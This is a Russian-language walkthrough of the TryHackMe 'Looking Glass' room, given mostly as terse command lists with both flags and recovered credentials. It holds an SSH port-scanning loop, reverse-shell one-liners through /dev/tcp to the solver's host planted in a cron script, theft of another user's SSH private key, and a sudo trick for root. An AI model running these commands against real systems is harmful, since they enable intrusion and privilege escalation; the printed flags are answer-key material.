[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Looking Glass](https://tryhackme.com/r/room/lookingglass) 

Всего 1 заданиe:
## Задание 1
Проберитесь сквозь Зеркало и захватите флаги.
### Ответьте на вопросы ниже
Получите флаг пользователя.
```commandline
nmap -sSCV -p- <IP>
for i in $(seq 9800 111111); do echo "connecting to port $i"; ssh -o 'LogLevel=ERROR' -o 'StrictHostKeyChecking=no' -p $i test@<IP>;done | grep -vE 'Lower|Higher'
#  jabberwocky
CyberChef > thealphabetcipher
jabberwock:bewareTheJabberwock

ssh jabberwock@<IP> -p 22
jabberwock:bewareTheJabberwock
cat uxer.txt
# reverse
```
```commandline
thm{65d3710e9d75d5f346d2bac669119a23}
```
+ 100
Получите корневой флаг.
```commandline
sudo -l
cat /etc/crontab

vim twasBrillig.sh
sh -i >& /dev/tcp/<my_own_IP>/4444 0>&1

nc -nlvp 4444
ls -la
cat humptydumpty.txt
# SHA256
su humptydumpty
cat poetry.txt
cp /home/alice/.ssh/id_rsa /home/humptydumpty
chmod 600 id_rsa
ssh alice@<IP> -i id_rsa
bash -i >& /dev/tcp/<my_own_IP>/5555 0>&1
pwncat --listen --port 5555
chmod +x lse.sh
./lse.sh -l 1 | tee lse.txt
sudo -h ssalg-gnikool -l -l
sudo -h ssalg-gnikool /bin/bash
cat /root/root.txt
```
```commandline
thm{bc2337b6f97d057b01da718ced6ead3f}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)